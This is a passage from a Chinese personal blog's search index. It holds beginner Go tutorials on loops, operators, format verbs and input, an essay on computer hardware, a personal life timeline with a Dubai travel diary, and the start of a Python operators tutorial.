time.Millisecond) &#125; fmt.Println(\"发射！\")&#125;/*打印 2 4 6 8 10... 100*/func main054() &#123; for i := 2; i &lt; 101; i += 2 &#123; fmt.Println(i) &#125;&#125;/*打一个10*5的“你妹”矩阵*/func main055() &#123; for j := 0; j &lt; 5; j++ &#123; //在同一行打印十个你妹 for i := 0; i &lt; 10; i++ &#123; fmt.Print(\"你妹\\t\\t\") &#125; fmt.Print(\"\\n\") &#125;&#125;/*打印九九乘法表*/func main056() &#123; for i := 1; i &lt;= 9; i++ &#123; for j := 1; j &lt;= i; j++ &#123; fmt.Print(j, \"*\", i, \"=\", j*i, \" \") &#125; fmt.Print(\"\\n\") &#125;&#125;func GetRandom() int &#123; /*获得随机数*/ //当前时间距离1970年0时所逝去的时间纳秒数 seed := time.Now().UnixNano() //使用当前时间纳秒作为随机数种子 myRandom := rand.New(rand.NewSource(seed)) //n := rand.Intn(1000) n := 100 + myRandom.Intn(900) //fmt.Println(n) //将结果随机数返回给调用者 return n&#125;/*·随机生成一个3位数答案·让用户输入其猜想·反馈给用户：猜大了、猜小了、猜对了·如果没猜对，就继续猜·猜对了就退出游戏·如果用户输入“-1”，就直接退出游戏*/func main057() &#123;START: //随机生成一个3位数答案 answer := GetRandom() fmt.Println(answer) var count int = 0 for &#123; /*让用户输入其猜想*/ var guess int fmt.Println(\"骚年请输入你的猜想(100-999),-1=退出，0=重玩，\") fmt.Scan(&amp;guess) /*看看用户是否想退出*/ if guess == -1 &#123; break &#125; else if guess == 0 &#123; goto START &#125; /*反馈给用户：猜大了、猜小了、猜对了*/ count ++ if guess &gt; answer &#123; fmt.Printf(\"猜大了,共用了%d次\\n\", count) &#125; else if guess &lt; answer &#123; fmt.Printf(\"猜小了,共用了%d次\\n\", count) &#125; else &#123; fmt.Printf(\"猜对了,共用了%d次\\n\", count) //跳出循环 break &#125; &#125; fmt.Println(\"GAME OVER\")&#125;/*打印1-49，逢5的整数倍就跳过*/func main058() &#123; var i int = 0 for &#123; i++ if i &gt; 49&#123; //跳出整个循环 break &#125; if i%5 == 0 &#123; //跳过本次循环的剩余部分，直接进入下一次循环 continue &#125; fmt.Print(\"当前是：\") fmt.Println(i) &#125; fmt.Println(\"GAME OVER\")&#125;func main() &#123; fmt.Println(GetRandom())&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang循环结构","slug":"Golang循环结构","permalink":"https://xiaowuyoucy.github.io/tags/Golang循环结构/"}]},{"title":"Golang程序运算","slug":"201911160050","date":"2019-11-15T16:51:18.000Z","updated":"2019-11-17T09:00:06.792Z","comments":true,"path":"2019/11/16/201911160050/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/201911160050/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153package mainimport ( \"fmt\" \"math\")func main() &#123; var a int = 10 /*自加1*/ //a = a + 2 //a += 2 //a++ /*自减1*/ //a = a - 1 //a -= 2 //a-- /*自乘运算*/ //a = a * 2 //a *= 2 //a = a / 2 //a /= 2 /*自求模（余）*/ //a = a % 3 a %= 3 fmt.Println(a)&#125;/*数学运算*/func main051() &#123; /*加减乘除，求余*/ fmt.Println(\"5+3=\", 5+3) //8 fmt.Println(\"5-3=\", 5-3) //2 fmt.Println(\"5*3=\", 5*3) //15 fmt.Println(\"5/3=\", 5/3) //1 fmt.Println(\"5%3=\", 5%3) //2 /*乘方和开方*/ fmt.Println(\"5^3=\", math.Pow(5, 3)) //125 fmt.Println(\"125开三次方=\", math.Pow(125.0, 1.0/3.0)) //5 /* 四舍五入 负数的四舍五入原则：先对绝对值四舍五入，再加负号 */ fmt.Println(\"3.49的四舍五入=\", math.Round(3.49)) //3 fmt.Println(\"3.51的四舍五入=\", math.Round(3.51)) //4 fmt.Println(\"-3.49的四舍五入=\", math.Round(-3.49)) //-3 fmt.Println(\"-3.51的四舍五入=\", math.Round(-3.51)) //-4 /*纯舍与纯入*/ fmt.Println(\"3.49的四舍五入=\", math.Floor(3.99)) //3 fmt.Println(\"3.51的四舍五入=\", math.Ceil(3.01)) //4 /*绝对值*/ fmt.Println(\"-3.14的绝对值\", math.Abs(-3.14)) //3.14 /* 三角函数： 参数必须是弧度而不是角度 */ fmt.Println(\"30°的正弦=\", math.Sin((30.0/180)*math.Pi)) fmt.Println(\"30°的余弦=\", math.Cos((30.0/180)*math.Pi)) fmt.Println(\"30°的正切=\", math.Tan((30.0/180)*math.Pi)) fmt.Println(\"30°的余切=\", 1.0/math.Tan((30.0/180)*math.Pi)) /*反三角函数*/ fmt.Println(\"正弦为0.5的角度是\", math.Asin(0.5)) //0.5235987755982989=30度的弧度表示&#125;/*比较运算比较运算符：&gt;,&lt;,==,!=,&gt;=,&lt;=比较运算的结果是布尔值：true或false*//*逻辑运算逻辑与：两者都为真，结果才为真逻辑或：两者只要有一个为真，结果就为真逻辑非：非真为假，非假为真*/func main052() &#123; a1 := (1+1 == 2) //true a0 := (1+1 != 2) //false b1 := (1+1 &gt;= 2) //true b0 := (1+1 &lt; 2) //false fmt.Println(a1, a0, b1, b0) /*逻辑与*/ fmt.Println(a1 &amp;&amp; b1) //true fmt.Println(a1 &amp;&amp; b0) //false fmt.Println(a0 &amp;&amp; b1) //false fmt.Println(a0 &amp;&amp; b0) //false /*逻辑或*/ fmt.Println(a1 || b1) //true fmt.Println(a1 || b0) //true fmt.Println(a0 || b1) //true fmt.Println(a0 || b0) //false /*逻辑或*/ fmt.Println(!a1) //false fmt.Println(!a0) //true fmt.Println(!b1) //false fmt.Println(!b0) //true&#125;/*位运算&amp; 按位与 两位都为1，结果才为1| 按位或 只要有一位为1，结果就为1^ 按位异或 两位不相同，结果就为1，否则就为0&lt;&lt;&gt;&gt;*/func main053() &#123; //a := 23 //b := 34 var a uint8 = 23 var b uint8 = 34 fmt.Println(a &amp; b) //2 fmt.Println(a | b) //55 fmt.Println(a ^ b) //53 /*移位运算*/ fmt.Println(a &lt;&lt; 2) //92 fmt.Println(a &gt;&gt; 2) //5 /* 左移的溢出 a为无符号8位整型，向左侧溢出后，最高位为数据位 */ fmt.Println(a &lt;&lt; 4) //112 fmt.Println(a &lt;&lt; 5) //1110,0000无符号为224 /* 左移的溢出 a为有符号8位整型，向左侧溢出后，最高位为符号位——要考虑正负数问题 最高位为0，非负数 最高位为1，负数的反码，-1再取反得到绝对值 */ var c int8 = 23 fmt.Println(c &lt;&lt; 5) //1110,0000有符号-32&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang程序运算","slug":"Golang程序运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang程序运算/"}]},{"title":"Golang基础类型占位符","slug":"20191116038","date":"2019-11-15T16:40:18.000Z","updated":"2019-11-15T16:46:18.416Z","comments":true,"path":"2019/11/16/20191116038/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/20191116038/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport \"fmt\"/*认识基本数据类型*/func main041() &#123; //整型 var a byte = 123 var b rune = 123 var c int = 123 var d uint = 123 fmt.Println(a,b,c,d) //浮点型 var rmb float32 = 1.23 //var atomRadius float64 = 1.234567890 var atomRadius = 1.234567890 fmt.Println(rmb,atomRadius) //字符串型 var name string = \"张三\" fmt.Println(name) //布尔型 var isClever = true var isBrave bool = false fmt.Println(isClever,isBrave) /*查看变量的类型*/ fmt.Printf(\"a的类型是%T\\n\",a) fmt.Printf(\"isClever的类型是%T\\n\",isClever) fmt.Printf(\"atomRadius的类型是%T\\n\",atomRadius) fmt.Printf(\"1.23的类型是%T\\n\",1.23) fmt.Printf(\"你妹的类型是%T\",\"你妹\") fmt.Printf(\"3+4i的类型是%T\",3+4i)&#125;/*基本类型占位符%s 字符串占位符%d 整型占位符（十进制）%f 浮点型占位符,%.2f精确到小数点后两位%t 布尔占位符*/func main() &#123; //使用占位符进行输出 fmt.Printf(\"我是%s,今年%d岁了，比特币余额%.2f，我美吗？——%t\\n\",\"比尔\",18,1.234567890,false) //输出时使用5字符宽度(默认右对齐) fmt.Printf(\"我是%5s,今年%5d岁了，比特币余额%5.2f，我美吗？——%5t\\n\",\"比尔\",18,1.234567890,false) //5位字符宽度，左对齐 fmt.Printf(\"我是%-5s,今年%-5d岁了，比特币余额%-5.2f，我美吗？——%-5t\\n\",\"比尔\",18,1.234567890,false) //打印并换行 fmt.Println(\"陈述完毕！\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础类型占位符","slug":"Golang基础类型占位符","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础类型占位符/"}]},{"title":"Golang标准输入与输出","slug":"201911152305","date":"2019-11-15T15:06:01.000Z","updated":"2019-11-15T15:42:39.487Z","comments":true,"path":"2019/11/15/201911152305/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152305/","excerpt":"","text":"每次接收一个用户输入 1234567891011121314151617181920212223242526272829303132333435package mainimport ( \"fmt\" \"strconv\")func main031() &#123; //定义a,b两个字符串型变量，用于接收用户的输入（用户的任何输入在类型转换前都是字符串） var a, b string //提示用户输入两个数 fmt.Println(\"骚年请输入相加的两个数：\") //将用户输入的第一个“数据”存入a的内存地址（&amp;a代表对变量a取地址） fmt.Scan(&amp;a) //将用户的第二个输入存入b的内存地址 fmt.Scan(&amp;b) fmt.Println(\"a=\", a) //12 fmt.Println(\"b=\", b) //34 // 字符串的相加实际是拼接操作 fmt.Println(\"a+b=\", a+b) //1234 // 先将字符串a,b转化为64位整型，再做相加计算 //aInt，bInt的类型为整型 aInt, _ := strconv.ParseInt(a, 0, 64) bInt, _ := strconv.ParseInt(b, 0, 64) fmt.Println(\"a+b=\", aInt+bInt) //输出结果&#125; 一次性接收多个用户输入 12345678910111213func main() &#123; fmt.Println(\"请输入两个女神的名字\") //定义两个字符串变量 var godess1, godess2 string //一次性接收两个用户输入，分别存入godess1, godess2变量的内存 //多次输入之间用空格分隔 fmt.Scan(&amp;godess1, &amp;godess2) fmt.Println(\"你喜欢\", godess1) fmt.Println(\"你喜欢\", godess2)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang标准输入与输出","slug":"Golang标准输入与输出","permalink":"https://xiaowuyoucy.github.io/tags/Golang标准输入与输出/"}]},{"title":"iota定义常量组","slug":"201911152154","date":"2019-11-15T13:56:00.000Z","updated":"2019-11-15T16:26:26.564Z","comments":true,"path":"2019/11/15/201911152154/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152154/","excerpt":"","text":"iota常量组概述 第一个常量的iota，值为0 后面的常量自动沿用第一个常量的表达式 后面常量中的iota会自动递增 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @Author: Administrator * @Description: * @File: 2 使用ioat定义常量组 * @Version: 1.13.4 * @Date: 2019/11/15 21:34 */package mainimport \"fmt\"/*使用iota 定义一组常量后边的常量(iota)会以n+1的递增，iota的序号默认是以0开始的*///案例1const ( USA = iota + 1 China Russia Britain France)func main1() &#123; fmt.Println(USA,China,Russia,Britain,France) //输出结果：1 2 3 4 5&#125;//案例2const ( Spring = (iota + 1) * 2 Summer Autumn Winter)func main() &#123; fmt.Println(Spring,Summer,Autumn,Winter) //输出结果：2 4 6 8&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"iota定义常量组","slug":"iota定义常量组","permalink":"https://xiaowuyoucy.github.io/tags/iota定义常量组/"}]},{"title":"Golang","slug":"201911152138","date":"2019-11-15T13:38:18.000Z","updated":"2019-12-04T17:07:39.006Z","comments":true,"path":"2019/11/15/201911152138/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152138/","excerpt":"","text":"Golang基础 1.1 常量、变量、表达式 1.2 iota定义常量组 1.3 标准输入与输出 1.4 基础类型占位符 1.5 程序运算 1.6 类型转换及移位运算 1.7 流程控制 1.8 循环结构 1.9 GOTO语句 2.0 延时执行 defer 2.1 函数 2.2 匿名函数 2.3 闭包函数 2.4 指针","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/tags/Golang/"}]},{"title":"计算机基础","slug":"201910190031","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-17T09:02:41.207Z","comments":true,"path":"2019/11/15/201910190031/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201910190031/","excerpt":"","text":"简谈计算机 人类的起源直到今天都是一个未解之谜或者有争议性的话题。 这个问题引申一下可以诞生几个新的问题： 火星曾经有过生命吗？ 地球的起源。 月球的起源。 宇宙的起源。 我们常常听说，光的速度是每秒30万公里，地球诞生46亿年。 恐龙6500万年被毁灭。 人类是由猿猴演变而来。 水是生命的起源。 很多人把这些从小听到大的科普知识当做真理，公理去视为衡量一切的标准。 但人类随着科学的进步，历史上曾经视为一些公理的知识已经被推翻。 谁能肯定光速在传播的过程中，不会像声音一样因为不同的介质而发生改变。 谁能肯定人类测量历史，年份的技术手段是精确无误或者误差很小。 谁能肯定生命的形成必须倚靠氧气呢？ 我们带着求知的心理去学习，去探索，去研究。 但也要提醒自己，我此时此刻所处的这个时代，我今天所学的知识，不一定就是完全准确的，对未知要有一颗谦卑敬畏之心。 亚里斯多德时代奉为真理的东西很快就被推翻了，现在没掌握的东西没准哪天就被发现掌握了。 有兴趣的朋友，可以通过搜索引擎看一下让人震惊的“电子双缝干涉实验” 。 虽然未必每一个人都要成为“计算机科学家”或者“程序员”。 但当你开始接触这个专业的时候，从某种程度上说：“你也是踏入了科学世界的大门。” 人类经历了石器时代、青铜时代、铁器时代、以及标志着近代的蒸汽时代、电气时代 现在踏入了信息时代，下一个时代也许是生物智能时代…… 在电气时代发现了电流，电子、电磁、电磁波、也有了世界第一台电子计算机。 后来又设计了机器语言、汇编语言、各种各样的编程语言，其中比较经典的是直到今天还有很多人学习使用的C语言、C++。 Unix、Linux、Windows操作系统也在不久之后诞生了第一个版本。 1999年上映了一部电影《异次元骇客》，电影讲述了用计算机虚拟出了洛杉矶，随着科学的发展以及人类对宇宙的观察。 有了一种新的猜测： 我们人类是被创造和设计的，就像程序员编写的游戏一样。 各种各样的自然法则，大气压，水压，重力，光速，声速等都是被提前设定好的。 著名的小说《三体》，电影《超时空接触》《星际穿越》《最远的地方》《黑客帝国》《月球》等艺术作品也拓展了我们想象的边缘。 如果你喜欢看一些网络小说和电影，那《无限恐怖》小说更是让人眼前一亮，脑洞大开。 人类与身居来的好奇心，不断地探索中，有很多我们肉眼无法看到的神秘力量。 这些东西对我们生活中吃喝拉撒似乎没有任何的意义，但只要把眼光抬高一点，仰望星空，一种奇妙难以言喻的心情，那是我们对未知，对真相的渴望。 温家宝总理2007年5月14日公布了一首诗歌《仰望星空》 一个民族有一些关注天空的人，他们才有希望；一个民族只是关心脚下的事情，那是没有未来的。 我们的民族是大有希望的民族！我希望同学们经常地仰望天空，学会做人，学会思考，学会知识和技能，做一个关心世界和国家命运的人。 仰望星空 我仰望星空， 它是那样辽阔而深邃； 那无穷的真理， 让我苦苦地求索追随。 我仰望星空， 它是那样庄严而圣洁； 那凛然的正义， 让我充满热爱、感到敬畏。 我仰望星空， 它是那样自由而宁静； 那博大的胸怀， 让我的心灵栖息依偎。 我仰望星空， 它是那样壮丽而光辉； 那永恒的炽热， 让我心中燃起希望的烈焰、响起春雷。 电脑结构 以上结构图，最初是由 冯·诺伊曼 （计算机科学家）所提出，又称之为”冯·诺伊曼结构“ 图中分别为：输入设备、输出设备、存储器、运算器和控制器；这些都是计算机的主要部件。 我们在玩电脑的时候，我们使用键盘鼠标来操作电脑，我们在和其他人QQ聊天的时候，鼠标可以帮我们选中聊天的人， 打开聊天窗口，键盘则是负责打字，帮我们输入聊天的内容。 我们在操作键盘鼠标的时候，其实都是在告诉电脑来做什么的。我们管键盘和鼠标叫输入设备。 输入设备： 向电脑输入数据和信息的设备。除了键盘。除了键盘鼠标，其他输入设备还包括触摸板、麦克风、摄像头，游戏手柄、扫描仪等等 显示器用来向我们展示画面，显示内容，音箱则播放音乐给我们听，我们管他们叫输出设备。 输出设备： 将电脑中的信息输出给用户的设备。常用的输入设备有：显示器、音箱、打印机、投影仪等等 我们买来电脑，如果只有键盘鼠标、显示器、音箱，我们能玩电脑么？肯定不能。 那么其实电脑机箱才是真正的工作的设备， 输入输出设备只是用来让我们和电脑机箱来做交互的。 那机箱内部都有什么呢？我们看一下下面的图片： 我们来看一下这里的零件都有什么用 主板 连接所有其他设备的设备，是其他设备的载体，主板主要是为CPU、内存、显卡、硬盘等提供平台，相当于人体的躯干，关联着各个器官。 中央处理器（Cntral Pocessing Uit ） CPU：中央处理单元(Cntral Pocessing Uit)的缩写，也叫处理器，是计算机的运算核心和控制核心。人靠大脑思考，电脑靠CPU来运算、控制。让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。也被人们称之为“数据仓库”。 内存 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 显卡 显卡：显示器想要呈现画面，显卡是关键。简单来说，就是负责在显示屏上显示一切信息。打个比方，它就像是人的眼睛，没有了它，电脑就无法驱动形成图像了。 显卡性能好，电脑的图形处理能力就高，尤其在玩游戏时更能发现这个（所以很多游戏会要求显卡性能）对玩家而言，最好选择独立显卡。不过，如果不玩大型游戏，CPU内置核心显卡也基本能满足要求;缺点： 系统功耗有所加大，发热量也较大，额外购买 。 电源 电源：将电压220伏的市电转换为低等电压，然后送到主板及各个硬件！供电！电脑运行需要电力，而电源就是为此供电的，也可以说它在为电脑提供一切动力。电源决定了电脑的稳定性。它和人体心脏功能类似，都是提供动力的核心。 网卡 网卡：提供联网的硬件，一般集成在主板上。 其他… 说了这么多，其实最最重要的设备是什么呢？ CPU、硬盘、内存。 现在我们来说一下CPU、硬盘、内存三者之间的关系。 首先 ,我们先回想一下三者的作用： CPU：是计算机的运算核心和控制核心，让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。 也被人们称之为“数据仓库”。 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 然后， 我们再来看一下程序是如何执行起来的。 当我们在电脑上打开QQ时（右键-打开 或者双击QQ图标），其实是通过鼠标（输入设备）向CPU发送了一条命令，CPU接收到这条命令后， QQ程序就从硬盘里被加载到内存（加载时不通过处理器，直接从硬盘加载程序到内存里），加载完成后，CPU就开始执行QQ程序。 程序执行起来后，CPU可以让QQ程序显示在我们的在显示器上。也就是你看到了QQ 程序运行起来了。如果这个时候，你用QQ截取了一张屏幕的图片， 那么这张图片会首先保存到内存，在没有退出截屏状态时，你可以在这张图片上写字、画线条，等你右键保存这张图片的时候，这张图片就会保存到硬盘里。 通过了解一个程序是如何运行起来的，我们就可以了解三者是如何工作的 。 可能有些人会不明白，如果程序是这样执行起来的话，那么为什么CPU不直接在硬盘里执行程序，而非要把程序放到内存后在执行呢？ 这里是有原因的。我们先来看几张图： 好点的企业用机械硬盘 ： 内存的读写速度： 通过上图我们可以看出，内存存取数据的速度比硬盘的存取速度快了10倍， 在某些环境里，硬盘和内存之间的速度差距可能会更大。 而CPU的速度比内存不知还要快多少倍。当我们把程序从硬盘放到内存以后，CPU就直接在内存运行程序，这样比CPU直接在硬盘运行程序就要快很多。 内存解决了一部分CPU运行过快，而硬盘数据存取太慢的问题。 提高了我们的电脑的运行速度。 内存就如同一条“高速车道”一般，数据由传输速度较慢的硬盘通过这条高速车道传送至CPU进行处理！ 但内存是带电存储的(一旦断电数据就会消失)，而且容量有限，所以要长时间储存程序或数据就需要使用硬盘。 其实内存在这里起了两个作用： \\1. 保存从硬盘读取的数据，提供给CPU使用 \\2. 保存CPU的一些临时执行结果，以便CPU下次使用或保存到硬盘 三者之间的关系： 简单来说，硬盘用来存储我们的程序和数据，当我们运行程序的时候，CPU首先接受到我们的命令，之后CPU是告诉硬盘，我要运行你存储的程序A， 你把程序A送到内存去。CPU对内存说，我让硬盘把程序A送到你这里来了，你保存一下。 等程序A被完整的送到内存之后。CPU就开始执行程序A。 过程就像上面说的，我们在举一个接近我们生活的例子。 如果说把硬盘比喻成一个大仓库，CPU比喻成加工车间，那么内存就是一个临时的小仓库；从距离上来说， 相比内存到CPU的距离和硬盘到内存的距离，内存和CPU的距离更短；硬盘（大仓库）用来保存车间需要用的原料和最终生产出来的商品。仓库太大，取出原料和存储商品太慢，耗时间。 内存（临时小仓库）：原料会先放到这里，小仓库，可以很快的找到需要的原料或商品。 CPU（车间）：从内存（小仓库）里拿到原料，生产商品。中间会有半成品，半成品可以放在内存（小仓库）里。","categories":[{"name":"简谈计算机","slug":"简谈计算机","permalink":"https://xiaowuyoucy.github.io/categories/简谈计算机/"}],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://xiaowuyoucy.github.io/tags/计算机基础/"}]},{"title":"Golang常量与变量表达式","slug":"201911151907","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-15T16:26:29.255Z","comments":true,"path":"2019/11/15/201911151907/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911151907/","excerpt":"","text":"1.常量与表里表达式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * @Author: Administrator * @Description: * @File: 01常量变量表达式 * @Version: 1.13.4 * @Date: 2019/11/15 18:58 */// 包名（main包下的main函数是程序的入口）package main// 导入sdk（software developing kit）中的fmt包import \"fmt\"/*一次性定义多个常量定义在函数以外的常量对所有函数可见*/const ( lightSpeed = 300000 months = 12)/*一次性定义多个变量定义在函数以外的变量对所有函数可见*/var ( //驼峰风格的成员定义 yearSeconds = 365 * 24 * 3600 //首字母大写的成员对其它包可见 //YearSeconds = 365 * 24 * 3600 //小写字母+下划线风格的成员定义 //year_seconds = 365 * 24 * 3600 //一个月有30天 monthDays = 30)// 入口函数（main包下的main函数是程序的入口）func main01() &#123; // 定义圆周率常量 const pi = 3.14 // 定义圆的半径变量 var radius = 10.0 // 定义圆面积变量 var area = 0.0 // 使用表达式求圆的面积，赋值给面积变量 area = pi * radius * radius // 输出结果 fmt.Println(\"圆的面积是\", area)&#125;// 访问全局常量和变量（写在函数外部的成员可以被当前包下的所有函数访问）func main02() &#123; //计算一光年的距离 //var lightYearDistance = lightSpeed * yearSeconds //变量的声明赋值二合一（只能在函数内部） lightYearDistance := lightSpeed * yearSeconds //计算一年大概有多少天 seasonDays := monthDays * months fmt.Println(\"一光年有\",lightYearDistance,\"公里；一个年有\",seasonDays,\"天\")&#125;func main() &#123; // 一次性定义多个常量 const a,b,c = 1,2,3 //一次性定义多个变量 var d,e,f = 4,5,6 //输出 fmt.Println(a,b,c) fmt.Println(d,e,f)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang常量与变量里表达式","slug":"Golang常量与变量里表达式","permalink":"https://xiaowuyoucy.github.io/tags/Golang常量与变量里表达式/"}]},{"title":"人生事件纪要","slug":"201909250204","date":"2019-09-24T18:18:00.000Z","updated":"2019-10-18T11:43:45.679Z","comments":true,"path":"2019/09/25/201909250204/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/25/201909250204/","excerpt":"","text":"1996.02.06 出生 2003.09.01 开始小学生涯 2009.07.01 结束小学生涯 2009.09.01 开始初中生涯 2011.07.01 结束初中生涯 2011.05.01 开始高中生涯 2013.05.01 结束高中生涯 2013.09.01 开始大学生涯 2015.7.01 结算大学生涯 2015.08 第一份实习工作 2015.08-2016.02 工作内容：前端开发 2016.03 嘉峪科技有限公司 2016.03-2016.12 工作内容：网络安全 2016.04.北京的记忆 2016.04 第一次去北京;目的：访问朋友，互相交流学习 同年在北京感受了人生中，第一场大雪。 2017.11.第一次开始创业 地点:北京昌平区 2018.06 第一次融资 ；地点:北京 2018.06.加入老男孩教育 加入老男孩旗下的 (深圳市爱编程教育科技有限公司) 深圳分校 任职：项目经理兼讲师 2019.08.迪拜出行 2019.08 第一次去迪拜;目的：相约于迪拜 机场出行前，我看到机场有Exchange货币兑换的服务站，换了些美刀（世界通用货币） 广州白云国际机场----&gt;排队取机票 买了从白云机场到科伦波，中转迪拜的航班机票 途径----&gt;科伦波----&gt;里斯兰卡 这一晚我没有睡，在飞机上打了一晚的斯洛克 早上 7:30分（科伦波时间） 抵达了 里斯兰卡机场，在机场待了一个上午 中午（12:55时）从里斯兰卡机场飞往迪拜 里斯兰卡上空 20:00时（北京时间）抵达迪拜国际机场 办理出境手续 迪拜的地铁 穿上了当地人的衣服（长袍） 是当地的一种文化 与朋友一起购买，当然是他们购物 - -! 我负责拿东西 见识了当今世界上最高的建筑， 哈利法塔（Burj Khalifa Tower ） 哈利法塔的电梯 ，世界上最快的电梯之一 身处于在哈利法塔（Burj Khalifa Tower ）顶层 位于著名的帆船酒店（ Burj Al Arab ）沙滩 回程的时候，我决定去一趟位于迪拜100多公里外的，阿布扎比市 位于阿布扎比法拉利公园 机场的美食广场内有麦当劳、汉堡王、法式饼店及印度远东餐厅等。此外还有星巴克、雪糕店等，在迪拜机场，总能找到你喜欢的口味，迪拜机场有很多中国售货员，在异国他乡听到服务员跟你说国语格外亲切,看桌面上的“亮点” 是我随时带着的充电宝，中国街电，我背包里还有好几个充电宝呢，哈哈。 在离开迪拜之前，在机场内逛了逛，迪拜机场内也非常奢华，所有的挂钟都是劳力士的，尽显奢华 ，这时我没有拍照片，这里名气最大的还是免税店，被誉为世界上第三大机场免税店，24小时营业，迪拜机场每年都举行机场购物中大奖促销活动，任何一个乘客，凡机场购物蛮一定金额，都有机会赢得豪华轿车，当然我能说这是个噱头吗？哪有那么容易，让你抽到豪车走，想想就好了。 逛了一下，也不知道买些什么手信带回去给朋友们，思路想去的也觉得没有什么可买，最后买了几条迪拜的香烟 我们则如同走在机场的传输带上一样,有信心的话我们可以倒着走,让别人先去,我们慢慢的欣赏沿途风景,因为 未来的生活是你今天的决定。 就满脸胡子的那个土著朋友，感叹的说 “此次的离别，不知道何时有机会见面，我说我们合影留念吧“ 我这朋友中文讲得不错好，给大家show一下 他讲中文的视频，哈哈哈~~~~ 我于23:30时（阿联酋迪拜时间）登上了飞机离开这片沙漠，此时是我人生中第一次坐世界上最大的客机A380，但我并不开心，因为我丢掉了行李箱，在起飞之前我尝试和飞机上的空姐以及机长沟通，容许我几分钟时间，让我去拿一下行李箱，他们对我说“NO” 理由是马上要起飞了，行李箱里面有我新买的衣服以及心爱的Nike鞋子，还有一些朋友送的东西，迪拜本地的特产。 只追求有道理 会耽误有效果的人生，难以有成功快乐的体验 用快乐带动心情，用观念导航人生 用执着追求事业 ，用真诚对待朋友，用平淡对待磨难，用努力追求幸福，用感恩对待生活，这就是人生旅途需要寻找的平衡点。","categories":[{"name":"关于博主","slug":"关于博主","permalink":"https://xiaowuyoucy.github.io/categories/关于博主/"}],"tags":[{"name":"人生事记","slug":"人生事记","permalink":"https://xiaowuyoucy.github.io/tags/人生事记/"}]},{"title":"Python运算符","slug":"201609060218","date":"2019-09-05T18:20:00.000Z","updated":"2019-09-05T21:19:05.032Z","comments":true,"path":"2019/09/06/201609060218/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/06/201609060218/","excerpt":"","text":"本章节主要说明Python的运算符。举个简单的例子 4 +5 = 9 。 例子中，4 和 5 被称为操作数，&quot;+&quot; 称为运算符。 Python语言支持以下类型的运算符: Python算术运算符 以下假设变量： a=10，b=20： 运算符描述实例 +加 - 两个对象相加 a + b 输出结果 30 -减 - 得到负数或是一个数减去另一个数 a - b 输出结果 -10 *乘 - 两个数相乘或是返回一个被重复若干次的字符串 a * b 输出结果 200 /除 - x除以y b / a 输出结果 2 %取模 - 返回除法的余数 b % a 输出结果 0 **幂 - 返回x的y次幂 a**b 为10的20次方， 输出结果 100000000000000000000 //取整除 - 返回商的整数部分（向下取整） &gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5 以下实例演示了Python所有算术运算符的操作： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2019/9/6 2:03# @Author : JIANWEIWEN# @Email : wjw19951218@gmail.com# @File : 1.运算符.py# @Software: PyCharma = 21b = 10c = 0c = a + bprint(\"1 - c 的值为：\", c)c = a - bprint(\"2 - c 的值为：\", c)c = a * bprint(\"3 - c 的值为：\", c)c = a / bprint(\"4 - c 的值为：\", c)c = a % bprint(\"5 - c 的值为：\", c)# 修改变量 a 、b 、ca = 2b = 3c = a ** bprint(\"6 - c 的值为：\", c)a = 10b = 5c = a // bprint(\"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 11 3 - c 的值为： 210 4 - c 的值为： 2 5 - c 的值为： 1 6 - c 的值为： 8 7 - c 的值为： 2 注意：Python2.x 